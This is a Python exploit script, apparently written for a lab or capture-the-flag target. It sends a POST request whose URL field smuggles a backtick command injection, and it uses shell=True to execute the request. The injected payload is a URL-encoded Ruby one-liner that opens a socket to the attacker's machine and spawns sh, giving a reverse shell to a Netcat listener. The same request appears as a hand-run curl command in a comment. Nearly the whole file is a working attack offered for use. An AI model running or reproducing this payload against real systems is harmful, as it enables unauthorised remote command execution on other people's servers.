import argparse
import requests
from subprocess import run


# ----------
# COMMANDLINE ARGUMENT SETUP
# ----------

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target', help='The URL of the target machine.')

parser.add_argument('-l', '--local', help='The IP of the local (attacking) machine.')
parser.add_argument('-lhp', '--lhport', help='The port of the local (attacking) machine\'s HTTP server.')
parser.add_argument('-llp', '--llport', help='The port of the local (attacking) machine\'s Netcat listener.')

args = parser.parse_args()

target_url = args.target

local_ip = args.local
local_http_port = args.lhport
local_listener_port = args.llport


# ----------
# REQUEST SETUP
# ---
# Modify these values as necessary for your particular situation.
# You may need different headers or a differently structured payload.
# ----------

# Via CURL (modify <b>bold</b> values):
# <i>curl '<b>TARGET-URL</b>' -X
# POST
# -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
# -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
# -H 'Accept-Language: en-US,en;q=0.5'
# -H 'Accept-Encoding: gzip, deflate'
# -H 'Content-Type: application/x-www-form-urlencoded'
# -H 'Origin: <b>TARGET_URL</b>'
# -H 'Connection: keep-alive'
# -H 'Referer: <b>TARGET_URL</b>'
# -H 'Upgrade-Insecure-Requests: 1'
# --data-raw 'url=http%3A%2F%2F<b>LOCAL-IP</b>%3A<b>LOCAL-HTTP-PORT</b>%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22<b>LOCAL-IP</b>%22%2C<b>LOCAL-LISTEN-PORT</b>%29%29%27%60'</i>

headers = '-H \'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\' ' + \
          '-H \'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\' ' + \
          '-H \'Accept-Language: en-US,en;q=0.5\' ' + \
          '-H \'Accept-Encoding: gzip, deflate\' ' + \
          '-H \'Content-Type: application/x-www-form-urlencoded\' ' + \
          f'-H \'Origin: {target_url}\' ' + \
          '-H \'Connection: keep-alive\' ' + \
          f'-H \'Referer: {target_url}\' ' + \
          '-H \'Upgrade-Insecure-Requests: 1\' '


payload = '--data-raw \'url=http%3A%2F%2F' + \
          local_ip + '%3A' + local_http_port + \
          '%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22' + \
          local_ip + '%22%2C' + local_listener_port + '%29%29%27%60\''

command = f'curl \'{target_url}\' -X POST {headers} {payload}'

run(command, shell=True)

print("\nReturn to your terminal session with the Netcat listener. "
      "If execution was successful, your reverse shell will be there.")
